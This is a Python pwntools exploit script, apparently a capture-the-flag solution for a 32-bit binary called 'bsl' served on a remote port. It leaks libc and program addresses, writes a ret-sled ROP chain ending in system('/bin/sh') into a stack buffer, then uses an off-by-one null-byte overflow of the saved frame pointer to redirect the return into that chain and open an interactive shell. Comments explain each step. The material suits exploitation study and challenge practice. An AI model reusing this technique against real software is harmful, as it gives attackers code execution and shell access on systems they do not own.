from pwn import *

PROG_NAME = "./bsl"
REMOTE_IP = "plsdonthaq.me"
REMOTE_PORT = 8001
REMOTE_LIBC = "./libc6_2.27-3ubuntu1_i386.so"
LOCAL_LIBC = "/lib/i386-linux-gnu/libc.so.6"

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
    libc = ELF(REMOTE_LIBC)
    ret_gadget = 0x00000417
else:
    p = process(PROG_NAME)
    elf = p.elf
    libc = ELF(LOCAL_LIBC)
    ret_gadget = 0x0001d144

if args.ATTACH:
	gdb.attach(p, '''break least_fav''')

'''
bsl gadgets:
0x000004a6: ret;


local libc gadgets:
0x0001d144: ret;


remote libc gadgets:
0x00000417: ret;
'''

'''
There is an 0x539 size buffer on the stack, created in the fav() function
(which starts at ebp-0x541)
memset is applied so it initially has all 0s
'''

# yes i wanna be your friend
p.sendlineafter("(y/n)\n", "y")
p.recvuntil(": ")

# note the favourite number which is puts' libc address
# then we can work out the libc base
puts_libc = int(p.recvline().rstrip(), 16)
libc.address = puts_libc - libc.symbols['puts']

# yes i want to learn an interesting fact about a number
p.sendlineafter("(y/n)\n", "y")
# we enter zero (or non number) to trigger a call to fgets()
p.sendline("0")

# fgets lets us store 0x538 bytes of data, inclusive of null terminator
# we want to write rop gadgets here, to keep them on the stack so we can
# jump to them later as we'll see
payload = b'A' # padding to get a 4-byte stack alignment
# we won't really be in control of which stack address we jump to, so
# we just use a big retsled followed with a payload to run system('/bin/sh')
payload += p32(libc.address+ret_gadget)*(0x528//4) # retsled
payload += p32(libc.symbols['system'])
payload += p32(0xdeadbeef)
payload += p32(next(libc.search(b'/bin/sh')))
p.sendline(payload)

# yes we have a least favourite number...
p.sendlineafter("(y/n)\n", "y")
# read in the least favourite number which is the address of the get_number function
p.recvuntil(": ")
get_number_addr = int(p.recvline().rstrip(), 16)
elf.address = get_number_addr - elf.symbols['get_number']
# a dummy number
p.sendline("0")

'''
at this point we are in the least_fav function and things get interesting:
push    eax {var_e4}
push    0xd1
lea     eax, [ebp-0xd0 {var_d4}]
push    eax {var_d4} {var_ec}
call    fgets

the buffer we are allowed to write to is at ebp-0xd0 but... 0xd1 bytes are read in,
inclusive of the null byte.
the preserved ebx value on the stack is at ebp-0x4, so this gets overwritten
but the preserved ebp value (which is fav() ebp), is stored at ebp-0x00
we clearly see that there is a null byte overflow into the preserved ebp value

what this will do for us, is it will set the least significant byte of preserved ebp
value, to 0x00. this has the effect of growing fav's ebp value "higher".

remember how fav previously had an 0x539 byte buffer?
by setting the lowest byte of fav's ebp higher, it will now be within the buffer

fav's return address to return to main would be kept at fav_ebp+0x4, however since
we changed fav's ebp, fav_ebp+0x4 now actually points to somewhere within the buffer

this means that fav's attempt to return to main will actually set off our rop chain
(starting with our RETsled), and popping our shell
'''

# firstly at ebp-0x4 there is a preserved ebx value which just contains the GOT address
# we preserve this to not mess up any calls to libc
payload = flat({0xcc : p32(elf.symbols['_GLOBAL_OFFSET_TABLE_'])})
p.sendafter("not?\n", payload)

# simply decline the program's next 2 questions
p.sendline()
p.sendline()

# then the program returns to main and we get a shell

p.interactive()